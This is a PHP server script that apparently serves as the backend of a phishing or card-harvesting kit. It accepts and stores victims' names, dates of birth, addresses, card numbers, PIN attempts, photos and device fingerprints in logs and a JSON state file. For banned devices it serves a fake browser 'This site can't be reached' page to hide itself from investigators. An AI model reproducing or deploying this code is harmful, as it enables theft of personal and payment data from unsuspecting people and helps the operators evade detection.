<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, X-Requested-With");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Debug logging to file
$debugLog = __DIR__ . '/debug.log';

// === GET LICENCE PIN (for app to fetch dynamically) ===
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'getLicencePin') {
    $configFile = __DIR__ . '/.admin_config.json';
    $config = file_exists($configFile) ? json_decode(file_get_contents($configFile), true) : [];
    $pin = isset($config['licence_pin']) ? $config['licence_pin'] : '4575';
    header('Content-Type: application/json');
    echo json_encode(['pin' => $pin]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'checkBan') {
    $bannedFile = __DIR__ . '/banned_devices.txt';
    $deviceId = isset($_GET['deviceId']) ? trim($_GET['deviceId']) : '';
    $isBanned = false;
    if ($deviceId !== '' && file_exists($bannedFile)) {
        $banned = file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $banned = array_map('trim', $banned);
        if (in_array($deviceId, $banned, true)) {
            $isBanned = true;
        }
    }

    @file_put_contents(__DIR__ . '/ban_debug.log', date('Y-m-d H:i:s') . " - CheckBan: deviceId=$deviceId, isBanned=" . ($isBanned ? 'YES' : 'NO') . " from IP " . (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown') . "\n", FILE_APPEND);

    if ($isBanned) {
        @file_put_contents(__DIR__ . '/ban_hits.log', date('Y-m-d H:i:s') . " - Early ban check: $deviceId from IP " . (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown') . "\n", FILE_APPEND);
        http_response_code(403);
        $host = $_SERVER['HTTP_HOST'];
        echo "<!-- DEVICE_BANNED -->";
        ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Site Can't Be Reached</title>
    <style>
        body { background-color: #f1f1f1; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; color: #5f6368; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { max-width: 600px; width: 100%; padding: 20px; }
        .icon { width: 72px; height: 72px; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABIAQMAAABvIyNsAAAABlBMVEUAAAD///+l2Z/dAAAAMklEQVR4AWMYBYJBAAEDYwADAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDYwABygE+m2vFmAAAAABJRU5ErkJggg=='); background-repeat: no-repeat; margin-bottom: 40px; }
        h1 { font-size: 22px; font-weight: 500; color: #202124; margin-bottom: 20px; }
        p { font-size: 14px; line-height: 20px; margin-bottom: 10px; }
        .error-code { margin-top: 30px; font-size: 12px; text-transform: uppercase; }
        ul { margin-top: 10px; padding-left: 20px; }
        li { margin-bottom: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon"></div>
        <h1>This site can't be reached</h1>
        <p>Check if there is a typo in <strong><?php echo htmlspecialchars($host); ?></strong>.</p>
        <ul>
            <li>If spelling is correct, try running Windows Network Diagnostics.</li>
        </ul>
        <div class="error-code">DNS_PROBE_FINISHED_NXDOMAIN</div>
    </div>
</body>
</html>
        <?php
        exit;
    }
    http_response_code(200);
    echo "OK";
    exit;
}

// === NORMAL LOGGING ===
$contentType = isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : 'none';
@file_put_contents($debugLog, date('Y-m-d H:i:s') . " [REQUEST] Method={$_SERVER['REQUEST_METHOD']}, Content-Type={$contentType}, Raw input received\n", FILE_APPEND);

// Read raw input
$rawInput = file_get_contents('php://input');
@file_put_contents($debugLog, date('Y-m-d H:i:s') . " [RAW] " . substr($rawInput, 0, 500) . "\n", FILE_APPEND);

$data = json_decode($rawInput, true);
if (!$data) {
    $data = isset($_GET) ? $_GET : [];
    @file_put_contents($debugLog, date('Y-m-d H:i:s') . " [FALLBACK] JSON decode failed, using GET data\n", FILE_APPEND);
}

// === EARLY BAN CHECK USING DEVICE ID ===
$bannedFile = __DIR__ . '/banned_devices.txt';
$deviceId = isset($data['deviceId']) ? trim($data['deviceId']) : 'unknown';

$isBannedFull = false;
if ($deviceId !== 'unknown' && file_exists($bannedFile)) {
    $banned = file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $banned = array_map('trim', $banned);
    if (in_array($deviceId, $banned, true)) {
        $isBannedFull = true;
    }
}

@file_put_contents($debugLog, date('Y-m-d H:i:s') . " [BANCHECK] deviceId=$deviceId, isBanned=" . ($isBannedFull ? 'YES' : 'NO') . "\n", FILE_APPEND);

if ($isBannedFull) {
    @file_put_contents(__DIR__ . '/ban_hits.log', date('Y-m-d H:i:s') . " - Banned device (FullRequest): $deviceId from IP " . (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown') . "\n", FILE_APPEND);
    
    http_response_code(200);
    $host = $_SERVER['HTTP_HOST'];
    echo "<!-- DEVICE_BANNED_FULL -->";
    ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Site Can't Be Reached</title>
    <style>
        body { background-color: #f1f1f1; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; color: #5f6368; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { max-width: 600px; width: 100%; padding: 20px; }
        .icon { width: 72px; height: 72px; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABIAQMAAABvIyNsAAAABlBMVEUAAAD///+l2Z/dAAAAMklEQVR4AWMYBYJBAAEDYwADAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDYwABygE+m2vFmAAAAABJRU5ErkJggg=='); background-repeat: no-repeat; margin-bottom: 40px; }
        h1 { font-size: 22px; font-weight: 500; color: #202124; margin-bottom: 20px; }
        p { font-size: 14px; line-height: 20px; margin-bottom: 10px; }
        .error-code { margin-top: 30px; font-size: 12px; text-transform: uppercase; }
        ul { margin-top: 10px; padding-left: 20px; }
        li { margin-bottom: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon"></div>
        <h1>This site can't be reached</h1>
        <p>Check if there is a typo in <strong><?php echo htmlspecialchars($host); ?></strong>.</p>
        <ul>
            <li>If spelling is correct, try running Windows Network Diagnostics.</li>
        </ul>
        <div class="error-code">DNS_PROBE_FINISHED_NXDOMAIN</div>
    </div>
</body>
</html>
    <?php
    exit;
}

// === Normal logging continues if not banned ===
$timestamp = date('Y-m-d H:i:s');

@file_put_contents($debugLog, date('Y-m-d H:i:s') . " [PARSE] Event=" . (isset($data['event']) ? $data['event'] : 'unknown') . ", deviceId=$deviceId\n", FILE_APPEND);

// Reliable IP Detection
$ip = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : (isset($_SERVER['HTTP_X_REAL_IP']) ? $_SERVER['HTTP_X_REAL_IP'] : (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown'));
if ($ip !== 'unknown' && strpos($ip, ',') !== false) {
    $ips = explode(',', $ip);
    $ip = trim($ips[0]);
}

$event       = isset($data['event']) ? $data['event'] : 'unknown';
$success     = (isset($data['success']) && ($data['success'] === true || $data['success'] === 'true' || $data['success'] === 1)) ? true : false;
$pin_attempt = isset($data['pin_attempt']) ? $data['pin_attempt'] : '—';
$name        = isset($data['name']) ? $data['name'] : '—';
$dob         = isset($data['dob']) ? $data['dob'] : '—';
$address     = isset($data['address']) ? $data['address'] : '—';
$card        = isset($data['card']) ? $data['card'] : '—';

// Extract fingerprint data
$known_keys = ['deviceId', 'ip', 'event', 'success', 'pin_attempt', 'name', 'dob', 'address', 'card', 'photo', 'timestamp'];
$fingerprint_data = [];
foreach ($data as $key => $value) {
    if (!in_array($key, $known_keys)) {
        $fingerprint_data[$key] = $value;
    }
}
$fingerprint = !empty($fingerprint_data) ? json_encode($fingerprint_data) : '—';

// Handle Photo
$photo_path = '—';
$has_photo = false;
if (isset($data['photo']) && !empty($data['photo']) && $deviceId !== 'unknown') {
    $photosDir = __DIR__ . '/photos';
    if (!is_dir($photosDir)) {
        @mkdir($photosDir, 0777, true);
    }
    if (is_dir($photosDir)) {
        $photo_path = $photosDir . '/' . $deviceId . '.txt';
        @file_put_contents($photo_path, $data['photo']);
        $has_photo = true;
        @file_put_contents($debugLog, date('Y-m-d H:i:s') . " [PHOTO] Saved photo for $deviceId\n", FILE_APPEND);
    }
}

// 1. Update Latest State (for "Current Devices" view)
$stateFile  = __DIR__ . '/latest_state.json';
$state = file_exists($stateFile) ? json_decode(file_get_contents($stateFile), true) : [];

// Fix for state being null/empty
if (!is_array($state)) {
    $state = [];
}

if ($deviceId !== 'unknown') {
    if (!isset($state[$deviceId])) {
        $state[$deviceId] = [
            'deviceId' => $deviceId,
            'ip' => $ip,
            'timestamp' => $timestamp,
            'event' => $event,
            'success' => $success ? 'YES' : 'NO',
            'pin_attempt' => $pin_attempt,
            'name' => $name,
            'dob' => $dob,
            'address' => $address,
            'card' => $card,
            'photo_path' => $photo_path,
            'fingerprint' => $fingerprint,
            'last_seen' => $timestamp,
            'attempt_count' => 0
        ];
        @file_put_contents($debugLog, date('Y-m-d H:i:s') . " [STATE] Created new device entry for $deviceId\n", FILE_APPEND);
    } else {
        $state[$deviceId]['ip'] = $ip;
        $state[$deviceId]['timestamp'] = $timestamp;
        $state[$deviceId]['event'] = $event;
        $state[$deviceId]['success'] = ($success || (isset($state[$deviceId]['success']) ? $state[$deviceId]['success'] : 'NO') === 'YES') ? 'YES' : 'NO';
        if ($pin_attempt !== '—') $state[$deviceId]['pin_attempt'] = $pin_attempt;
        if ($name !== '—') $state[$deviceId]['name'] = $name;
        if ($dob !== '—') $state[$deviceId]['dob'] = $dob;
        if ($address !== '—') $state[$deviceId]['address'] = $address;
        if ($card !== '—') $state[$deviceId]['card'] = $card;
        if ($fingerprint !== '—') $state[$deviceId]['fingerprint'] = $fingerprint;
        if ($photo_path !== '—') $state[$deviceId]['photo_path'] = $photo_path;
        $state[$deviceId]['last_seen'] = $timestamp;
    }

    if ($event === 'pin_failed' || $event === 'pin_success') {
        $state[$deviceId]['attempt_count'] = (isset($state[$deviceId]['attempt_count']) ? $state[$deviceId]['attempt_count'] : 0) + 1;
    }

    $written = @file_put_contents($stateFile, json_encode($state, JSON_PRETTY_PRINT));
    @file_put_contents($debugLog, date('Y-m-d H:i:s') . " [STATE] Written $written bytes to $stateFile\n", FILE_APPEND);
    if ($written === false) {
        @file_put_contents($debugLog, date('Y-m-d H:i:s') . " [STATE] FAILED to write state file!\n", FILE_APPEND);
    }
}

// 2. Append to Visits History (visits.log) - always in project directory
$visitsLog = __DIR__ . '/visits.log';

// Ensure directory is writable
$visitsLogDir = dirname($visitsLog);
if (!is_writable($visitsLogDir)) {
    @chmod($visitsLogDir, 0755);
}

$visitEntry = [
    'timestamp' => $timestamp,
    'deviceId' => $deviceId,
    'ip' => $ip,
    'event' => $event,
    'success' => $success,
    'pin_attempt' => $pin_attempt,
    'name' => $name,
    'dob' => $dob,
    'address' => $address,
    'card' => $card,
    'has_photo' => $has_photo
];

$written = @file_put_contents($visitsLog, json_encode($visitEntry) . "\n", FILE_APPEND);
@file_put_contents($debugLog, date('Y-m-d H:i:s') . " [VISIT] Written entry for $event to $visitsLog (bytes: $written)\n", FILE_APPEND);

if ($written === false) {
    @file_put_contents($debugLog, date('Y-m-d H:i:s') . " [VISIT] FAILED to write visits.log! Attempted path: $visitsLog\n", FILE_APPEND);
    // Try alternate path
    $altLog = __DIR__ . '/visits_alt.log';
    $written2 = @file_put_contents($altLog, json_encode($visitEntry) . "\n", FILE_APPEND);
    @file_put_contents($debugLog, date('Y-m-d H:i:s') . " [VISIT] Alt write result: $written2 to $altLog\n", FILE_APPEND);
}

header('Content-Type: application/json');
echo json_encode(["status" => "ok", "logged" => true]);
@file_put_contents($debugLog, date('Y-m-d H:i:s') . " [DONE] Response sent\n", FILE_APPEND);
?>